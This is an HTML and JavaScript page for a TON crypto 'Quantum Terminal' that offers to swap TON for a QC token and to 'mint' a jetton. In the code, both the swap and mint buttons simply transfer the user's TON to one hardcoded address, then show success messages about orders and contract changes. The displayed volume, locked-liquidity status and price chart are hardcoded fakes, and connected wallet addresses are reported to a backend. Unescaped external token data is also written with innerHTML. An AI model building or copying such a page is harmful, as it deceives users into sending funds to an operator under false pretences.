<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>QUANTUM TERMINAL v4.1</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-cyan: #00f2ff;
            --glass-bg: rgba(10, 15, 25, 0.7);
        }
        body {
            background: radial-gradient(circle at 50% 50%, #0a111a 0%, #020508 100%);
            background-size: 120% 120%;
            font-family: 'JetBrains+Mono', monospace;
            color: white;
            overflow: hidden;
            height: 100vh;
        }
        .glass-panel {
            background: var(--glass-bg);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(0, 242, 255, 0.1);
        }
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
        
        .whale-toast {
            background: rgba(0, 0, 0, 0.8);
            border-left: 3px solid var(--neon-cyan);
            padding: 10px 20px;
            margin-bottom: 8px;
            border-radius: 4px;
            transition: all 0.5s ease;
        }
        .nav-item.active { color: var(--neon-cyan); text-shadow: 0 0 10px var(--neon-cyan); }
    </style>
</head>
<body class="flex items-center justify-center">
    <canvas id="bg-canvas" class="absolute inset-0 pointer-events-none"></canvas>

    <div class="relative w-full max-w-md h-[90vh] glass-panel rounded-3xl flex flex-col overflow-hidden shadow-2xl mx-4">
        
        <header class="p-6 border-b border-white/5 flex justify-between items-center bg-white/5">
            <div>
                <h1 class="text-xs font-black tracking-[0.2em] text-cyan-400">QUANTUM ENGINE</h1>
                <p class="text-[9px] text-slate-500 uppercase">v4.1 System Active</p>
            </div>
            <div id="connectBtn"></div>
        </header>

        <div id="user-profile-mini" class="hidden px-6 py-3 bg-cyan-500/5 border-b border-cyan-500/20 flex items-center justify-between">
            <div class="flex items-center gap-3">
                <div class="w-8 h-8 rounded-full bg-cyan-500/20 flex items-center justify-center border border-cyan-500/30">
                    <span class="text-cyan-400 text-[10px]">OP</span>
                </div>
                <div>
                    <p id="wallet-short-addr" class="text-[10px] font-bold text-white">Connecting...</p>
                    <p id="profile-status" class="text-[8px] text-cyan-500">SYNCING...</p>
                </div>
            </div>
            <p id="main-balance-ton" class="text-xs font-mono font-bold text-cyan-400">0.00 TON</p>
        </div>

        <main class="flex-1 overflow-y-auto p-6 scrollbar-hide">
            
            <section id="wallet" class="tab-content active">
                <div class="mb-6">
                    <h2 class="text-[10px] uppercase text-slate-500 mb-4 tracking-widest">Digital Assets</h2>
                    <div id="tokenList" class="space-y-1">
                        <p class="text-center text-slate-500 py-10 text-[10px]">AUTH REQUIRED</p>
                    </div>
                </div>
            </section>

            <section id="swap" class="tab-content">
                <div class="glass-panel rounded-2xl p-4 mb-4">
                    <label class="text-[9px] text-slate-500 uppercase block mb-2">Sell TON</label>
                    <input type="number" id="swapInput" oninput="calculateSwap()" placeholder="0.00" 
                           class="w-full bg-transparent border-none outline-none text-2xl font-bold text-white mb-2">
                    <div class="flex justify-between items-center text-[10px] text-slate-400">
                        <span>Balance: --</span>
                        <span class="text-cyan-500 cursor-pointer">MAX</span>
                    </div>
                </div>

                <div class="flex justify-center -my-3 relative z-10">
                    <div class="w-8 h-8 rounded-full bg-cyan-500 flex items-center justify-center shadow-lg shadow-cyan-500/40">
                        <svg class="w-4 h-4 text-black" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
                    </div>
                </div>

                <div class="glass-panel rounded-2xl p-4 mt-4 mb-6">
                    <label class="text-[9px] text-slate-500 uppercase block mb-2">Buy QUANCORE (QC)</label>
                    <input type="text" id="swapOutput" readonly placeholder="0" 
                           class="w-full bg-transparent border-none outline-none text-2xl font-bold text-cyan-400">
                    <p class="text-[9px] text-slate-500 mt-2">Rate: 1 TON = 1000 QC (Fixed)</p>
                </div>

                <button id="mainSwapBtn" onclick="executeSwap()" 
                        class="w-full py-4 bg-cyan-500 hover:bg-cyan-400 text-black font-black text-xs uppercase tracking-[0.2em] rounded-xl transition-all shadow-lg shadow-cyan-500/20">
                    Connect Wallet
                </button>
            </section>

            <section id="analytics" class="tab-content">
                <div class="h-48 w-full mb-6">
                    <canvas id="liquidityChart"></canvas>
                </div>
                <div class="grid grid-cols-2 gap-4">
                    <div class="glass-panel p-4 rounded-xl">
                        <p class="text-[8px] text-slate-500 uppercase">Volume 24h</p>
                        <p class="text-sm font-bold text-emerald-400">+12.4%</p>
                    </div>
                    <div class="glass-panel p-4 rounded-xl">
                        <p class="text-[8px] text-slate-500 uppercase">LP Status</p>
                        <p class="text-sm font-bold text-cyan-400">LOCKED</p>
                    </div>
                </div>
                <button id="deployBtn" onclick="deployJetton()" class="w-full mt-6 py-3 border border-cyan-500/50 text-cyan-400 text-[10px] font-bold uppercase rounded-lg">
                    Mint Jetton
                </button>
            </section>
        </main>

        <nav class="p-4 border-t border-white/5 bg-black/40 flex justify-around items-center">
            <button onclick="switchTab('wallet', this)" class="nav-item active flex flex-col items-center gap-1">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
                <span class="text-[8px] uppercase font-bold">Wallet</span>
            </button>
            <button onclick="switchTab('swap', this)" class="nav-item flex flex-col items-center gap-1">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path></svg>
                <span class="text-[8px] uppercase font-bold">Swap</span>
            </button>
            <button onclick="switchTab('analytics', this)" class="nav-item flex flex-col items-center gap-1">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"></path></svg>
                <span class="text-[8px] uppercase font-bold">Data</span>
            </button>
        </nav>

        <div id="whale-alerts" class="absolute top-20 right-4 left-4 pointer-events-none z-50"></div>
    </div>

    <script>
        // --- КОНФИГУРАЦИЯ ---
        const QC_CONTRACT = "EQBrZYrk2PA659JmMCnkWVbLp14-5Gq8Yp9X_H9uR1pI_6_P"; 
        const QC_SYMBOL = "QC";
        const QC_IMAGE = "https://tonraffles.app/jetton/logo.png";

        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://quantum.bothost.tech/static/tonconnect-manifest.json',
            buttonRootId: 'connectBtn'
        });

        let userWallet = null;

        // --- ЛОГИКА TONCONNECT ---
        tonConnectUI.onStatusChange(async wallet => {
            userWallet = wallet;
            updateUIState();
            if(wallet) {
                const address = wallet.account.address;
                showWhaleAlert("Quantum Sync", "Operator Verified");
                syncWalletWithBackend(address);
                await fetchWalletData(address);
            } else {
                resetWalletData();
            }
        });

        async function syncWalletWithBackend(address) {
            try {
                await fetch('/api/connect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address, timestamp: Date.now() })
                });
            } catch (e) { console.error("Backend Sync Offline"); }
        }

        async function fetchWalletData(address) {
            try {
                const elements = {
                    shortAddr: document.getElementById('wallet-short-addr'),
                    profile: document.getElementById('user-profile-mini'),
                    status: document.getElementById('profile-status'),
                    mainBal: document.getElementById('main-balance-ton')
                };

                if(elements.shortAddr) elements.shortAddr.innerText = `${address.slice(0, 4)}...${address.slice(-4)}`;
                if(elements.profile) elements.profile.classList.remove('hidden');
                if(elements.status) elements.status.innerText = "VERIFIED OPERATOR";

                const [accRes, jettonRes] = await Promise.all([
                    fetch(`https://tonapi.io/v2/accounts/${address}`),
                    fetch(`https://tonapi.io/v2/accounts/${address}/jettons`)
                ]);

                const accData = await accRes.json();
                const jettonData = await jettonRes.json();
                
                const tonBalance = (accData.balance / 1e9).toFixed(2);
                if(elements.mainBal) elements.mainBal.innerText = `${tonBalance} TON`;

                renderJettons(jettonData.balances, tonBalance);
            } catch (e) {
                showWhaleAlert("Sync Error", "Blockchain data unreachable");
            }
        }

        function renderJettons(balances, tonBalance) {
            const list = document.getElementById('tokenList');
            if (!list) return;
            list.innerHTML = '';
            
            // 1. TON
            list.innerHTML += createTokenRow("TON", "TON", tonBalance, "https://ton.org/download/ton_symbol.png", "5.24", false);

            // 2. QC
            const qcAsset = balances.find(b => b.jetton.address === QC_CONTRACT);
            if(qcAsset) {
                const j = qcAsset.jetton;
                const bal = (parseInt(qcAsset.balance) / Math.pow(10, j.decimals)).toFixed(2);
                list.insertAdjacentHTML('afterbegin', createTokenRow(j.name, j.symbol, bal, j.image || QC_IMAGE, "0.00", true));
            }

            // 3. Others
            balances.forEach(item => {
                if(item.jetton.address === QC_CONTRACT) return;
                const j = item.jetton;
                const bal = (parseInt(item.balance) / Math.pow(10, j.decimals)).toFixed(2);
                if (parseFloat(bal) > 0) {
                    const price = item.price ? item.price.prices.USD : 0;
                    list.innerHTML += createTokenRow(j.name, j.symbol, bal, j.image, price, false);
                }
            });
        }

        function createTokenRow(name, symbol, balance, img, price, isQC = false) {
            const highlight = isQC ? 'border border-cyan-500/40 bg-cyan-500/10' : 'hover:bg-white/5';
            const badge = isQC ? '<span class="text-[8px] bg-cyan-500 text-black px-1 rounded ml-1">CORE</span>' : '';
            const usdValue = (balance * price).toFixed(2);

            return `
                <div class="flex justify-between items-center px-3 py-2 rounded-xl transition-all ${highlight} mb-1 border border-transparent">
                    <div class="flex items-center gap-3">
                        <img src="${img}" class="w-8 h-8 rounded-full border border-white/10" onerror="this.src='https://wallet.tg/assets/logo.png'">
                        <div>
                            <p class="font-bold text-sm text-white">${symbol}${badge}</p>
                            <p class="text-[9px] text-slate-500">${name}</p>
                        </div>
                    </div>
                    <div class="text-right">
                        <p class="font-bold text-sm text-white">${balance}</p>
                        <p class="text-[9px] text-emerald-400 font-mono">${isQC ? 'STABLE' : '$' + usdValue}</p>
                    </div>
                </div>
            `;
        }

        // --- SWAP & DEPLOY ---
        function calculateSwap() {
            const input = document.getElementById('swapInput');
            const output = document.getElementById('swapOutput');
            const rate = 1000;
            if(input && output) output.value = input.value ? (input.value * rate).toFixed(0) : '';
        }

        async function executeSwap() {
            if (!userWallet) { await tonConnectUI.connectWallet(); return; }
            const amount = document.getElementById('swapInput')?.value;
            if(!amount || amount <= 0) return showWhaleAlert("Error", "Enter TON amount");

            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: "EQB3ncyBUTjZUA5EnGhc_f_697L6SSc88_m5_N0D83v97m8",
                    amount: (amount * 1e9).toString(), 
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                showWhaleAlert("Order Sent", `Buying ${QC_SYMBOL}...`);
            } catch (e) { showWhaleAlert("Declined", "User rejected swap"); }
        }

        async function deployJetton() {
            if (!userWallet) { await tonConnectUI.connectWallet(); return; }
            const btn = document.getElementById('deployBtn');
            if(btn) { btn.innerText = "FORGING..."; btn.disabled = true; }
            
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [{
                    address: "EQB3ncyBUTjZUA5EnGhc_f_697L6SSc88_m5_N0D83v97m8", 
                    amount: "270000000",
                }]
            };

            try {
                await tonConnectUI.sendTransaction(transaction);
                showWhaleAlert("Success", "Contract modification initiated");
            } catch (e) { showWhaleAlert("Failed", "Transaction cancelled"); }
            finally { if(btn) { btn.disabled = false; btn.innerText = "Mint Jetton"; } }
        }

        // --- UI HELPERS ---
        function switchTab(tabId, el) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.getElementById(tabId)?.classList.add('active');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
            if (tabId === 'analytics') setTimeout(initChart, 100);
        }

        function updateUIState() {
            const btns = { swap: document.getElementById('mainSwapBtn'), deploy: document.getElementById('deployBtn') };
            if(btns.swap) btns.swap.innerText = userWallet ? "Execute Swap" : "Connect Wallet";
            if(btns.deploy) btns.deploy.innerText = userWallet ? "Mint Jetton" : "Connect Wallet";
        }

        function resetWalletData() {
            document.getElementById('user-profile-mini')?.classList.add('hidden');
            const list = document.getElementById('tokenList');
            if(list) list.innerHTML = '<p class="text-center text-slate-500 py-10 text-[10px]">AUTH REQUIRED</p>';
            updateUIState();
        }

        function showWhaleAlert(title, text) {
            const container = document.getElementById('whale-alerts');
            const alert = document.createElement('div');
            alert.className = 'whale-toast';
            alert.innerHTML = `<p class="text-cyan-400 font-bold text-[10px] uppercase">${title}</p><p class="text-white text-[10px] opacity-80">${text}</p>`;
            container.appendChild(alert);
            setTimeout(() => { alert.style.opacity = '0'; setTimeout(() => alert.remove(), 500); }, 4000);
        }

        // --- VISUALS ---
        let myChart = null;
        function initChart() {
            const ctx = document.getElementById('liquidityChart')?.getContext('2d');
            if(!ctx) return;
            if(myChart) myChart.destroy();
            myChart = new Chart(ctx, {
                type: 'line',
                data: {
                    labels: ['12:00', '13:00', '14:00', '15:00', '16:00', '17:00'],
                    datasets: [{
                        data: [980, 1050, 1020, 1100, 1080, 1250],
                        borderColor: '#00f2ff',
                        backgroundColor: 'rgba(0, 242, 255, 0.05)',
                        fill: true, tension: 0.4, borderWidth: 2, pointRadius: 0
                    }]
                },
                options: { responsive: true, maintainAspectRatio: false, plugins: { legend: { display: false } }, 
                           scales: { y: { grid: { color: 'rgba(255,255,255,0.02)' }, ticks: { color: '#475569', size: 9 } }, 
                                     x: { grid: { display: false }, ticks: { color: '#475569', size: 9 } } } }
            });
        }

        // Background Particles
        const canvasBg = document.getElementById('bg-canvas');
        if(canvasBg) {
            const ctx = canvasBg.getContext('2d');
            let pts = [];
            function init() {
                canvasBg.width = window.innerWidth; canvasBg.height = window.innerHeight;
                pts = Array.from({length: 45}, () => ({ 
                    x: Math.random()*canvasBg.width, y: Math.random()*canvasBg.height, 
                    s: Math.random()*1.2, v: Math.random()*0.2 + 0.05 
                }));
            }
            function draw() {
                ctx.clearRect(0,0,canvasBg.width, canvasBg.height);
                ctx.fillStyle = "rgba(0, 242, 255, 0.15)";
                pts.forEach(p => { p.y -= p.v; if(p.y < 0) p.y = canvasBg.height; ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); });
                requestAnimationFrame(draw);
            }
            window.addEventListener('resize', init);
            init(); draw();
        }
    </script>
</body>
</html>
